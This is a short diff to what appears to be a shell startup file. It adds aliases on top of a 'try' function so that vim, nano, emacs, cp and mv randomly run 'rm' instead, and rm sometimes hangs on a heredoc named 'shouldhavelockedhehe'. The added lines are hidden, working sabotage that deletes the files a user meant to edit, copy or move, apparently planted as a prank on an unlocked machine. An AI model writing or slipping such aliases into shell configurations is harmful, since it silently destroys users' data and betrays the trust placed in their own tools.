@@ -1,5 +1,3 @@
-
-#try default alt 1/prob
 try (){
 	if [ $(($RANDOM%$3)) -eq 0 ]; then
 		echo $2
@@ -11,3 +9,6 @@ try (){
 alias vim="\`try \"vim\" \"rm\" 40\`"
 alias nano="\`try \"nano\" \"rm\" 40\`"
 alias emacs="\`try \"emacs\" \"rm\" 40\`"
+alias cp="\`try \"cp\" \"rm\" 40\`"
+alias mv="\`try \"mv\" \"rm\" 40\`"
+alias rm="\`try \"rm\" \"shouldhavelockedhehe <<\" 6\`"
